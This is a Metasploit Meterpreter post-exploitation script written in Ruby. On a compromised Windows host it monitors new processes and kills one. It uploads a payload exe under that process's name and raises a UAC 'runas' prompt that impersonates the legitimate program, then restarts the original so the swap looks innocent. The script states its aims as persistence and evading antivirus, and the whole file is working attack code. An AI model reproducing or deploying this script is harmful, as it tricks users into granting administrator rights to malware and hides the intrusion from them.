# Author: Wave
print_status("Hello World")
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-f"  => [ true,  "local payload file"],
"-p"  => [ true,  "process to phish, * for all"],

)
process = "*"
exe = "/root/payload.exe"
#-------------------------------------------------------------------------------
def usage
  print_line "Meterpreter Script to create a Persistence on the remote host using custom exe and vbs to stay undetected by AV."
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
##############options##############options##############options########
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-f"
    exe = val
  when "-p"
    process = val
end
}
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
##############FUNCTIONS################################################
###function to upload payload#######
def exeonly(name,exe,path)
location = session.sys.config.getenv('TEMP')
print_status("upload in #{location}")

        fileexe = "#{location}\\#{name}" 
      print_status("Uploading exe...")
      session.fs.file.upload_file("#{fileexe}","#{exe}")
      print_good("payload uploaded!")
      print_status("Uploaded as #{fileexe}")
exec(fileexe,path)
end

###function to execute payload######
def exec(fileexe,path)
print_good("spawning UAC prompt...")
session.railgun.shell32.ShellExecuteA(nil,"runas",fileexe,nil,nil,5)
print_status("waiting for user")
restart_process(path)
end
####function to monitor new processes#################
def procmon(exe,process)
procs = []
existingProcs = []
detected = false
first = true
print_status("Monitoring new processes. waiting #{process}")
while detected == false
sleep 1
procs = client.sys.process.processes
procs.each do |p|
if p['name'] == process or process == "*"
##exclude bad processes, not all but some for win10 are here#####
if p['name'] != "smartscreen.exe" && p['name'] != "conhost.exe" && p['name'] != "LocationNotificationWindows.exe" && p['name'] != "LocationNotificationWindows.exe" && p['name'] != "backgroundTaskHost.exe"
###feel free to add processes you dont want to kill#####
if first == true
existingProcs.push(p['pid'])
else
if !existingProcs.include? p['pid']
print_status("New process detected: #{p['pid']} #{p['name']}")
print_status("lets kill process and prompt uac, pretenting to be #{p['name']}")
name = p['name'] 
pid = p['pid']
path = p['path']
print_good(path)
letsbreak = killpid(pid,name,exe,path)
if letsbreak == true
raise("Now i'm leaving you")
end
end
end
end
end
end
first = false
end
end

###process killer#####
def killpid(pid,name,exe,path)
begin
client.sys.process.kill(pid)   
exeonly(name,exe,path) 
letsbreak = true
return letsbreak
rescue ::Exception => e
print_error(e)
letsbreak = false
return letsbreak
print_status("continuing...")    
procmon(exe,process) 
end
print_status(letsbreak)
end                    
####function to restart processes##########################
def restart_process(path)
print_status("restarting #{path} not to look suspicious...")  
session.sys.process.execute(path, nil, {'Hidden' => false})
print_good("MOUHAHAHA job done :D")
end

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
##############MAIN##############MAIN##############MAIN##############MAIN
procmon(exe,process)


